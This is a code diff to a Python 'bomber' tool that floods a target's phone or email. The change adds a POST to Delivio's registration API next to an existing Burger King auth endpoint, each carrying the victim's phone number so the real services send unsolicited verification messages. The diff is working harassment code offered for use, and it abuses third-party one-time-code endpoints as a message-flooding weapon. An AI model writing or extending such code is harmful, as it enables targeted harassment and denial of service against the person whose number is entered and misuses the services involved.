@@ -35,7 +35,7 @@ print(colored("""
 
 
 def output_status(response, provider):
-    if response.status_code == 200:
+    if response.status_code in (200, 201):
         print(colored(f"{provider} sent successful", "blue"))
     else:
         print(colored(f"{provider} Failure", "red"))
@@ -83,12 +83,25 @@ async def phone_bomber(phone):
     payload_bk = make_bk_payload(phone)
     try:
         feature_bk = loop.run_in_executor(None,
-                                          lambda: requests.request("POST", url='https://burger-king.by/local/ajax/auth.php',
+                                          lambda: requests.request("POST",
+                                                                   url='https://burger-king.by/local/ajax/auth.php',
                                                                    headers=burger_headers, data=payload_bk))
         response_bk = await feature_bk
         output_status(response_bk, "Burger King")
     except Exception as e:
         print(colored(e, "green"))
+    print(colored("Started Dilivio", "blue"))
+    payload_delivio = "{{\"phone\":\"+{0}\"}}".format(phone.replace('+', ''))
+    try:
+        feature_delivio = loop.run_in_executor(None,
+                                               lambda: requests.request("POST",
+                                                                        url='https://delivio.by/be/api/register',
+                                                                        headers=delivio_headers, data=payload_delivio))
+        response_delivio = await feature_delivio
+        output_status(response_delivio, "Delivio")
+    except Exception as e:
+        print(colored(e, "green"))
+
 
 if __name__ == '__main__':
     option = int(input(colored("Chose desirable option... [1] - Email bomber, [2] - phone bomber: \n", "blue")).strip())
